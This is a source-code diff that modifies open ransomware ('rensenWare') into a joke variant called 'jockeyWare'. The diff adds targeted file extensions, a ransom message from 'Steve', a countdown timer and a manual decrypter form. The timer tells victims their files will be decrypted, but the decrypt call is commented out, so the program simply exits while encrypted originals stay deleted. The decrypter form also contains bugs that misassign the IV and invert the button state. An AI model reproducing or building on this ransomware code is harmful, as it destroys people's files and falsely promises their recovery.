@@ -2,10 +2,15 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
+using System.Timers;
+using System.ComponentModel;
+using System.Drawing;
+using System.Threading;
+using System.Windows.Forms;
 
-namespace rensenWare
+namespace jockeyWare
 {
-	internal static class Program
+	internal class Program
 	{
 		// File extensions rensenware searches for
 		private static readonly string[] targetExtensions = new string[]
@@ -25,7 +30,8 @@ namespace rensenWare
 			".mp4",  ".mkv",
 			".zip",  ".rar",
 			".alz",  ".egg",
-			".7z",   ".raw"
+			".7z",   ".raw",
+			".csv",  ".wma"
 		};
 
 		internal static List<string> encryptedFiles = new List<string>();
@@ -39,7 +45,7 @@ namespace rensenWare
 		[STAThread]
 		private static void Main()
 		{
-			Program.randomIV  = new byte[16];
+		    	Program.randomIV  = new byte[16];
 			Program.randomKey = new byte[32];
 			
 			RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider();
@@ -118,8 +124,16 @@ namespace rensenWare
 			}
 			
 			Console.WriteLine("Hello. I'm Steve and i just encrypted all your personal files!\nWatch \"A Minecraft Movie\" until the part where I yell \"CHICKEN JOCKEY!\" for me to decrypt them.");
-			Console.WriteLine("Press any key to exit.");
+			Console.WriteLine("Since I can't provide my own movie with this for bullshit reasons I'll set a timer and trust that you're gonna watch the minecraft movie while you wait.\nWhen the timer reaches zero (chicken jockey scene) your files will be decrypted.");
+			Console.Write("Press any key to start the timer. ");
 			Console.ReadKey();
+
+			timmyr = new Timer(1000);
+			timmyr.AutoReset = true;
+			timmyr.Elapsed += onTimerElapse;
+			timmyr.Start();
+			Console.ReadLine();
+			
 			/*
 			if (File.Exists(Program.KeyFilePath) && File.Exists(Program.IVFilePath))
 			{
@@ -134,6 +148,38 @@ namespace rensenWare
                                        }
                                }
                         }*/
+		}
+
+	        public static int countdown = 15;
+                public static Timer timmyr;
+
+                static void onTimerElapse(Object source, System.Timers.ElapsedEventArgs e)
+                {
+		        countdown--;
+		        if(countdown < 1)
+		        {
+		                /*
+                                if (File.Exists(Program.KeyFilePath) && File.Exists(Program.IVFilePath))
+                                {
+                                        Program.randomKey = File.ReadAllBytes(Program.KeyFilePath);
+                                        if (Program.randomKey.Length == 32)
+                                        {
+                                                Program.randomIV = File.ReadAllBytes(Program.IVFilePath);
+                                                if (Program.randomIV.Length == 16)
+                                                {
+                                                        Application.Run(new frmManualDecrypter());
+                                                        return;
+                                                }
+                                        }
+                                }*/
+			        Console.WriteLine("CHICKEN JOCKEY!!!!!!");
+			        timmyr.Stop();
+			        Environment.Exit(0);
+                        }
+		        else
+		        {
+		                Console.WriteLine("\nTime left: " + countdown.ToString() + " seconds");
+		        }
 		}
 
 		internal static void Crypt(string path, bool IsDecrypt = false)
@@ -171,6 +217,118 @@ namespace rensenWare
 					File.Delete(path);
 				}
 			}
+		}
+	}
+
+	public partial class frmManualDecrypter
+	{
+		private byte[] Key;
+		private byte[] IV;
+
+		public frmManualDecrypter()
+		{
+			this.InitializeComponent();
+		}
+
+		private void ButtonKey_Click(object sender, EventArgs e)
+		{
+			OpenFileDialog openFileDialog = new OpenFileDialog
+			{
+				Title  = "Open Key File",
+				Filter = "Key/IV Binary File (*.bin)|*.bin"
+			};
+
+			if (openFileDialog.ShowDialog() == DialogResult.OK)
+			{
+				this.KeyPath.Text = openFileDialog.FileName;
+				this.Key = File.ReadAllBytes(openFileDialog.FileName);
+				if (this.Key.Length != 32)
+				{
+					MessageBox.Show("Invalid Key File!");
+				}
+			}
+			else
+			{
+				this.Key = null;
+			}
+			this.StartDecrypt.Enabled = (this.Key == null || this.IV == null);
+		}
+
+		private void StartDecrypt_Click(object sender, EventArgs e)
+		{
+			OpenFileDialog openFileDialog = new OpenFileDialog
+			{
+				Title  = "Open Multiple Encrypted Files",
+				Filter = "All (*.*)|*.*",
+				Multiselect = true
+			};
+
+			if (openFileDialog.ShowDialog() == DialogResult.OK)
+			{
+				string[] files = openFileDialog.FileNames;
+				this.ProgressDecrypt.Value = 0;
+				this.ProgressDecrypt.Maximum = files.Length;
+				new Thread(delegate()
+				{
+					foreach (string fileName in files)
+					{
+						try
+						{
+							this.DecryptStatus.Invoke(new MethodInvoker(delegate()
+							{
+								this.DecryptStatus.Text = Path.GetFileName(fileName);
+							}));
+
+							Program.Crypt(fileName, true); // Decrypt the file
+							
+							this.ProgressDecrypt.Invoke(new MethodInvoker(delegate()
+							{
+								ProgressBar progressDecrypt = this.ProgressDecrypt;
+								int value = progressDecrypt.Value;
+								progressDecrypt.Value = value + 1;
+							}));
+
+							this.DecryptedList.Invoke(new MethodInvoker(delegate()
+							{
+								this.DecryptedList.Items.Add(fileName);
+								this.DecryptedList.SelectedIndex = this.DecryptedList.Items.Count - 1;
+							}));
+						}
+						catch
+						{
+							this.DecryptedList.Invoke(new MethodInvoker(delegate()
+							{
+								this.DecryptedList.Items.Add("FAIL : " + fileName);
+								this.DecryptedList.SelectedIndex = this.DecryptedList.Items.Count - 1;
+							}));
+						}
+					}
+				}).Start();
+			}
+		}
+
+		private void ButtonIV_Click(object sender, EventArgs e)
+		{
+			OpenFileDialog openFileDialog = new OpenFileDialog
+			{
+				Title  = "Open IV File",
+				Filter = "Key/IV Binary File (*.bin)|*.bin"
+			};
+
+			if (openFileDialog.ShowDialog() == DialogResult.OK)
+			{
+				this.IVPath.Text = openFileDialog.FileName;
+				this.Key = File.ReadAllBytes(openFileDialog.FileName);
+				if (this.Key.Length != 16)
+				{
+					MessageBox.Show("Invalid IV File!");
+				}
+			}
+			else
+			{
+				this.IV = null;
+			}
+			this.StartDecrypt.Enabled = (this.Key == null || this.IV == null);
 		}
 	}
 }
